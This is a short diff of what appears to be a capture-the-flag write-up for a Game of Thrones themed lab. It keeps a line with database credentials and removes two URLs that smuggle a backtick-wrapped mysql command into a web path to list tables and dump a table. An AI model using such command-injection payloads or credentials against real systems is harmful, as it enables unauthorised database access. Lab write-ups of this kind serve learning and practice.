@@ -623,14 +623,7 @@ db: kingslanding
 
 user/pass: cerseilannister/_g0dsHaveNoMercy_
 
-```
-http://192.168.178.150:1337/casterly-rock/blob/master/%22%22%60mysql -h 192.168.178.150 -u cerseilannister -p_g0dsHaveNoMercy_ -D kingslanding -e “show tables;”%60
-```
 
-![[Pasted image 20260216023737.png]]
-
-
-**http://192.168.178.150:1337/casterly-rock/blob/master/%22%22%60mysql -h 192.168.178.150 -u cerseilannister -p_g0dsHaveNoMercy_ -D kingslanding -e “select * from iron_throne;”%60**
 
 ----
 # SECRET DATA :
